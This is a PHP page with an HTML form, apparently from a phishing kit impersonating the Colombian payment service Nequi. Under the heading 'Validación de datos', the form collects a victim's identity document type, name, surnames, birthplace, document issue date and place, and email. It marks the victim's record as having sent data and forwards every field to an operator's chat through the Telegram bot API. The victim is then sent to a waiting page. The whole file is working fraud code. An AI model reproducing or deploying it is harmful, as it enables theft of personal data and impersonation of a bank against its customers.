<?php
// Incluir el archivo de conexión a la base de datos
include '../../db.php';
$config = include '../../config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $cliente_id = $_POST['cliente_id'];
    $documento_identidad = $_POST['documento_identidad'];
    $nombre = $_POST['nombre'];
    $apellidos = $_POST['apellidos'];
    $fecha_expedicion = $_POST['fecha_expedicion'];
    $lugar_nacimiento = $_POST['lugar_nacimiento'];
    $lugar_expedicion = $_POST['lugar_expedicion'];
    $correo = $_POST['correo'];

    if (empty($cliente_id)) {
        die("Error: El ID del cliente no puede estar vacío.");
    }

    // Obtener la IP del cliente
    $ip_cliente = $_SERVER['REMOTE_ADDR'];

    // Cambiar el estado a 7 en la base de datos
    $estado = 7; // Estado para datos enviados
    $sql = "UPDATE nequi SET estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);

    if ($stmt->execute(['estado' => $estado, 'id' => $cliente_id])) {
        // Telegram: Enviar los datos del formulario
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        // Crear el mensaje para el formulario
        $messageFormulario = "📝 *Actualización de Datos (Nequi)*\n\n"
            . "📄 *Documento de Identidad:* `" . escapeMarkdownV2($documento_identidad) . "`\n"
            . "👤 *Nombre:* `" . escapeMarkdownV2($nombre) . "`\n"
            . "👤 *Apellidos:* `" . escapeMarkdownV2($apellidos) . "`\n"
            . "📅 *Fecha de Expedición:* `" . escapeMarkdownV2($fecha_expedicion) . "`\n"
            . "🏙️ *Lugar de Nacimiento:* `" . escapeMarkdownV2($lugar_nacimiento) . "`\n"
            . "🏢 *Lugar de Expedición:* `" . escapeMarkdownV2($lugar_expedicion) . "`\n"
            . "📧 *Correo:* `" . escapeMarkdownV2($correo) . "`\n";

        $dataFormulario = [
            'chat_id' => $chatId,
            'text' => $messageFormulario,
            'parse_mode' => 'MarkdownV2',
        ];

        $urlFormulario = "https://api.telegram.org/bot$botToken/sendMessage";
        $chFormulario = curl_init($urlFormulario);
        curl_setopt($chFormulario, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($chFormulario, CURLOPT_POST, true);
        curl_setopt($chFormulario, CURLOPT_POSTFIELDS, http_build_query($dataFormulario));
        curl_exec($chFormulario);
        curl_close($chFormulario);

        // Notificación de botones (opcional, si se quiere repetir)
        // ...

        // Redirigir a la página de espera pasando el ID del cliente
        header("Location: espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al actualizar.";
    }

    // Cerrar conexión no es necesario con PDO
}
?>





<!-- Formulario HTML -->
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Datos</title>
    <!-- Incluir Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="config/css/datos.css">
</head>

<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header text-center">
                        <h2>Datos</h2>
                        <center>
                            <p class="text2">Validación de datos</p>
                        </center>
                    </div>
                    <div class="card-body">
                        <form action="" method="post">
                            <input type="hidden" name="cliente_id"
                                value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">

                            <div class="form-floating mb-3">
                                <select class="form-control" name="documento_identidad" id="documento_identidad"
                                    required>
                                    <option value="Cédula">Cédula</option>
                                    <option value="Pasaporte">Pasaporte</option>

                                    <!-- Agrega más opciones según sea necesario -->
                                </select>
                                <label for="documento_identidad">Documento de Identidad</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" name="nombre" id="nombre" placeholder=""
                                    required>
                                <label for="nombre">Nombre</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" name="apellidos" id="apellidos" placeholder=""
                                    required>
                                <label for="apellidos">Apellidos</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" name="lugar_nacimiento" id="lugar_nacimiento"
                                    placeholder="" required>
                                <label for="lugar_nacimiento">Documento</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="date" class="form-control" name="fecha_expedicion" id="fecha_expedicion"
                                    placeholder="" required>
                                <label for="fecha_expedicion">Fecha de Expedición</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="text" class="form-control" name="lugar_expedicion" id="lugar_expedicion"
                                    placeholder="" required>
                                <label for="lugar_expedicion">Lugar de Expedición</label>
                            </div>

                            <div class="form-floating mb-3">
                                <input type="email" class="form-control" name="correo" id="correo" placeholder=""
                                    required>
                                <label for="correo">Correo</label>
                            </div>

                            <button type="submit" class="btn btn-primary btn-block">Siguiente</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Incluir Bootstrap JS y dependencias (jQuery y Popper.js) -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.4/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>
